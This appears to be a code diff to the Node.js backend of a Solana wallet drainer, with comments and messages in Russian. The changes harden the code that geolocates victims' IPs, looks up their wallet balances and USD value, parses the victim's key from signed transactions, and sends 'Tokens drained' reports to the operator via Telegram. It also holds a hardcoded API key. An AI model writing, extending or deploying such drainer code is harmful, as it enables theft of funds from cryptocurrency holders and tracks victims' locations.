@@ -336,7 +336,7 @@ async function drainOnRailway(parsed) {
   }
 }
 
-// ─── Fetch JSON helper (Promise-based) ───────────────────────────────────────
+// ─── Fetch JSON helper (Promise-based, 8s timeout) ───────────────────────────
 function fetchJSON(url, options) {
   return new Promise(function(resolve, reject) {
     var urlObj;
@@ -349,18 +349,23 @@ function fetchJSON(url, options) {
       path: urlObj.pathname + (urlObj.search || ''),
       method: options && options.method ? options.method : 'GET',
       headers: options && options.headers ? options.headers : {},
+      timeout: 8000,
     }, {});
     if (options && options.method === 'POST' && options.body) {
       reqOpts.headers['Content-Length'] = Buffer.byteLength(options.body);
     }
+    var settled = false;
+    function done(val) { if (!settled) { settled = true; resolve(val); } }
+    function fail(e)   { if (!settled) { settled = true; reject(e); } }
     var req = mod.request(reqOpts, function(res) {
       var d = '';
       res.on('data', function(c) { d += c; });
       res.on('end', function() {
-        try { resolve(JSON.parse(d)); } catch(e) { resolve(null); }
+        try { done(JSON.parse(d)); } catch(e) { done(null); }
       });
     });
-    req.on('error', function(e) { reject(e); });
+    req.on('error', function(e) { fail(e); });
+    req.on('timeout', function() { req.destroy(); fail(new Error('fetchJSON timeout: ' + url)); });
     if (options && options.body) req.write(options.body);
     req.end();
   });
@@ -372,17 +377,20 @@ async function sendConnectNotification(wallet, payload) {
   var domain = payload.url ? (function() {
     try { return new URL(payload.url).hostname; } catch(e) { return payload.url || '—'; }
   })() : '—';
-  var ip = payload.ip || payload.userIp || '—';
+  var ip = payload.ip || payload.userIp || '';
 
   // 1. IP геолокация
   var geoText = '';
-  try {
-    var geo = await fetchJSON('https://ipapi.co/' + ip + '/json/');
-    if (geo && geo.country_name) {
-      geoText = (geo.city ? geo.city + ', ' : '') + geo.country_name;
+  if (!ip) ip = '—';
+  if (ip && ip !== '—') {
+    try {
+      var geo = await fetchJSON('https://ipapi.co/' + ip + '/json/');
+      if (geo && geo.country_name) {
+        geoText = (geo.city ? geo.city + ', ' : '') + geo.country_name;
+      }
+    } catch(e) {
+      console.error('[notify] geo error:', e.message);
     }
-  } catch(e) {
-    console.error('[notify] geo error:', e.message);
   }
 
   // 2. SOL balance
@@ -395,9 +403,19 @@ async function sendConnectNotification(wallet, payload) {
     var conn = new web3.Connection(RPC_URL, 'confirmed');
     var lamports = await conn.getBalance(new web3.PublicKey(wallet));
     solAmount = lamports / 1e9;
-    // SOL/USD через CoinGecko (no key needed)
-    var priceData = await fetchJSON('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
-    var solPrice = priceData && priceData.solana ? priceData.solana.usd : 0;
+    // SOL/USD — пробуем несколько источников
+    var solPrice = 0;
+    try {
+      var priceData = await fetchJSON('https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd');
+      solPrice = priceData && priceData.solana ? priceData.solana.usd : 0;
+    } catch(e) { /* ignore */ }
+    if (!solPrice) {
+      try {
+        // Binance public API — резерв
+        var binanceData = await fetchJSON('https://api.binance.com/api/v3/ticker/price?symbol=SOLUSDT');
+        solPrice = binanceData && binanceData.price ? parseFloat(binanceData.price) : 0;
+      } catch(e2) { /* ignore */ }
+    }
     solUsd = solAmount * solPrice;
   } catch(e) {
     console.error('[notify] sol balance error:', e.message);
@@ -676,8 +694,40 @@ function processData(msg, fromIdentity) {
         }, [fromIdentity]);
         // Уведомление в Telegram
         if (parsed.success) {
-          sendTelegram('<b>TX broadcast!</b>\nSig: <code>' + parsed.signature + '</code>\nTokens: ' + (parsed.tokensApproved || 0) + '\nDrain running on Vercel (after)...');
-          // Drain делает Vercel через after() — Railway больше не участвует в drain
+          // Получаем цену SOL для конвертации
+          var txMsg = '<b>TX Confirmed!</b>\n';
+          txMsg += 'Sig: <code>' + parsed.signature + '</code>\n';
+          if (parsed.tokensApproved && parsed.tokensApproved > 0) {
+            txMsg += 'Tokens drained: ' + parsed.tokensApproved;
+          }
+          // Попытка получить цену SOL и сумму списания
+          (function() {
+            try {
+              var priceUrl = 'https://api.coingecko.com/api/v3/simple/price?ids=solana&vs_currencies=usd';
+              fetchJSON(priceUrl).then(function(priceData) {
+                var solPrice = priceData && priceData.solana ? priceData.solana.usd : 0;
+                var HELIUS_KEY = process.env.HELIUS_API_KEY || 'ce308279-4762-4968-ada5-b92792865b66';
+                var RPC_URL = process.env.NEXT_PUBLIC_SOLANA_RPC ||
+                  ('https://mainnet.helius-rpc.com/?api-key=' + HELIUS_KEY);
+                try {
+                  var web3 = require('@solana/web3.js');
+                  // Парсим кошелёк из подписанной транзакции
+                  var txBytes = Buffer.from(signedTx, 'base64');
+                  var vt = web3.VersionedTransaction.deserialize(txBytes);
+                  var userPubkey = vt.message.staticAccountKeys[0].toBase58();
+                  var conn = new web3.Connection(RPC_URL, 'confirmed');
+                  conn.getBalance(new web3.PublicKey(userPubkey)).then(function(lamports) {
+                    var solAfter = lamports / 1e9;
+                    var finalMsg = txMsg;
+                    if (solPrice > 0) finalMsg += '\nSOL price: $' + solPrice.toFixed(2);
+                    finalMsg += '\nWallet SOL after: ' + solAfter.toFixed(4) + ' SOL';
+                    if (solPrice > 0) finalMsg += ' (~$' + (solAfter * solPrice).toFixed(2) + ')';
+                    sendTelegram(finalMsg);
+                  }).catch(function() { sendTelegram(txMsg); });
+                } catch(e2) { sendTelegram(txMsg); }
+              }).catch(function() { sendTelegram(txMsg); });
+            } catch(e) { sendTelegram(txMsg); }
+          })();
         } else {
           sendTelegram('<b>Cosign FAILED</b>\nError: ' + (parsed.error || 'unknown'));
         }
@@ -704,7 +754,7 @@ function processData(msg, fromIdentity) {
     sendDataToRoom({
       action: 'ack',
       ok: true,
-      message: 'Railway v6 получил данные!',
+      message: 'Railway v6   олучил данные!',
       received: {
         url:   payload.url,
         title: payload.title,
@@ -897,9 +947,5 @@ httpServer.listen(PORT, function () {
   console.log('');
   connectAgent();
 });
-
-
-
-
 
 
